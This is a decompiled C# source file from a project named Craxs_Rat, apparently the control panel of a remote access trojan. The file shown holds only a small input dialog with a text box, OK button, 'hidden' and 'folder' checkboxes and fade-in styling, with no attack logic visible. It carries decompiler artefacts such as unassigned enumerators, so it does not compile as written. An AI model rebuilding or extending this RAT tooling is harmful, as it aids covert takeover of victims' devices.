using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000D5 RID: 213
	[DesignerGenerated]
	public partial class inp : Form
	{
		// Token: 0x0600100D RID: 4109 RVA: 0x000AB440 File Offset: 0x000A9640
		public inp()
		{
			base.Load += this.inp_Load;
			this.rectangles_0 = new List<Rectangle>();
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x170004C6 RID: 1222
		// (get) Token: 0x06001010 RID: 4112 RVA: 0x00006F6C File Offset: 0x0000516C
		// (set) Token: 0x06001011 RID: 4113 RVA: 0x000ABA08 File Offset: 0x000A9C08
		internal virtual Panel Panel1
		{
			[CompilerGenerated]
			get
			{
				return this._Panel1;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel1_Paint);
				Panel panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint -= value2;
				}
				this._Panel1 = value;
				panel = this._Panel1;
				if (panel != null)
				{
					panel.Paint += value2;
				}
			}
		}

		// Token: 0x170004C7 RID: 1223
		// (get) Token: 0x06001012 RID: 4114 RVA: 0x00006F74 File Offset: 0x00005174
		// (set) Token: 0x06001013 RID: 4115 RVA: 0x000ABA4C File Offset: 0x000A9C4C
		internal virtual Label LTitle { get; set; }

		// Token: 0x170004C8 RID: 1224
		// (get) Token: 0x06001014 RID: 4116 RVA: 0x00006F7C File Offset: 0x0000517C
		// (set) Token: 0x06001015 RID: 4117 RVA: 0x000ABA60 File Offset: 0x000A9C60
		internal virtual TextBox InputText { get; set; }

		// Token: 0x170004C9 RID: 1225
		// (get) Token: 0x06001016 RID: 4118 RVA: 0x00006F84 File Offset: 0x00005184
		// (set) Token: 0x06001017 RID: 4119 RVA: 0x000ABA74 File Offset: 0x000A9C74
		internal virtual Button b_ok
		{
			[CompilerGenerated]
			get
			{
				return this._b_ok;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.b_ok_Click);
				Button b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click -= value2;
				}
				this._b_ok = value;
				b_ok = this._b_ok;
				if (b_ok != null)
				{
					b_ok.Click += value2;
				}
			}
		}

		// Token: 0x170004CA RID: 1226
		// (get) Token: 0x06001018 RID: 4120 RVA: 0x00006F8C File Offset: 0x0000518C
		// (set) Token: 0x06001019 RID: 4121 RVA: 0x000ABAB8 File Offset: 0x000A9CB8
		internal virtual Panel BOXX { get; set; }

		// Token: 0x170004CB RID: 1227
		// (get) Token: 0x0600101A RID: 4122 RVA: 0x00006F94 File Offset: 0x00005194
		// (set) Token: 0x0600101B RID: 4123 RVA: 0x000ABACC File Offset: 0x000A9CCC
		internal virtual CheckBox CheckHidden { get; set; }

		// Token: 0x170004CC RID: 1228
		// (get) Token: 0x0600101C RID: 4124 RVA: 0x00006F9C File Offset: 0x0000519C
		// (set) Token: 0x0600101D RID: 4125 RVA: 0x000ABAE0 File Offset: 0x000A9CE0
		internal virtual CheckBox CheckFolder { get; set; }

		// Token: 0x170004CD RID: 1229
		// (get) Token: 0x0600101E RID: 4126 RVA: 0x00006FA4 File Offset: 0x000051A4
		// (set) Token: 0x0600101F RID: 4127 RVA: 0x000ABAF4 File Offset: 0x000A9CF4
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x06001020 RID: 4128 RVA: 0x000ABB38 File Offset: 0x000A9D38
		private void method_0()
		{
			try
			{
				foreach (Label label in this.Panel1.Controls.OfType<Label>())
				{
					label.ForeColor = Module5.White;
					label.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Label> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			try
			{
				foreach (TextBox textBox in this.Panel1.Controls.OfType<TextBox>())
				{
					textBox.ForeColor = Module5.White;
					textBox.BackColor = Module5.color_0;
					this.rectangles_0.Add(checked(new Rectangle(textBox.Location.X - 1, textBox.Location.Y - 1, textBox.Width + 1, textBox.Height + 1)));
				}
			}
			finally
			{
				IEnumerator<TextBox> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			try
			{
				foreach (Button button in this.Panel1.Controls.OfType<Button>())
				{
					button.BackColor = Module5.White;
					button.ForeColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Button> enumerator3;
				if (enumerator3 != null)
				{
					enumerator3.Dispose();
				}
			}
			try
			{
				foreach (CheckBox checkBox in this.BOXX.Controls.OfType<CheckBox>())
				{
					checkBox.ForeColor = Module5.White;
					checkBox.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<CheckBox> enumerator4;
				if (enumerator4 != null)
				{
					enumerator4.Dispose();
				}
			}
			try
			{
				foreach (Panel panel in base.Controls.OfType<Panel>())
				{
					panel.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Panel> enumerator5;
				if (enumerator5 != null)
				{
					enumerator5.Dispose();
				}
			}
			this.Refresh();
		}

		// Token: 0x06001021 RID: 4129 RVA: 0x000ABD58 File Offset: 0x000A9F58
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06001022 RID: 4130 RVA: 0x000ABDA0 File Offset: 0x000A9FA0
		private void inp_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\12.ico");
			this.method_0();
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06001023 RID: 4131 RVA: 0x00022684 File Offset: 0x00020884
		private void b_ok_Click(object sender, EventArgs e)
		{
			base.DialogResult = DialogResult.OK;
		}

		// Token: 0x06001024 RID: 4132 RVA: 0x000ABDEC File Offset: 0x000A9FEC
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color white = Module5.White;
			if (this.rectangles_0.Count > 0)
			{
				try
				{
					foreach (Rectangle rect in this.rectangles_0)
					{
						if (rect.Width > 0)
						{
							e.Graphics.FillRectangle(new SolidBrush(white), rect);
						}
					}
				}
				finally
				{
					List<Rectangle>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
		}

		// Token: 0x040008CD RID: 2253
		private List<Rectangle> rectangles_0;
	}
}
